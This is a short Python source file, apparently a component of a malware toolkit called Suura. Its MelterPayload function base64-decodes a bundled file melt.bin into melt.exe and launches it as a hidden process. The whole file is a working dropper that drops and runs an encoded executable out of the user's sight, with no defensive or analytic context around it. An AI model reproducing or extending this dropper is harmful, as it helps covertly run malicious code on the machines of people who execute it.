import os
import base64
from Suura.includes.suura_subprocess import *

def MelterPayload():
    if os.path.exists(os.path.abspath("melt.bin")):
        with open("melt.bin","rb") as melt_fd:
            bin_content = base64.b64decode(melt_fd.read())
        with open("melt.exe","wb") as raw_melt_fd:
            raw_melt_fd.write(bin_content)
        process = Process()
        process.process_type = ProcessType.open_hide_process
        process.command = os.path.abspath("melt.exe")
        process.exec()
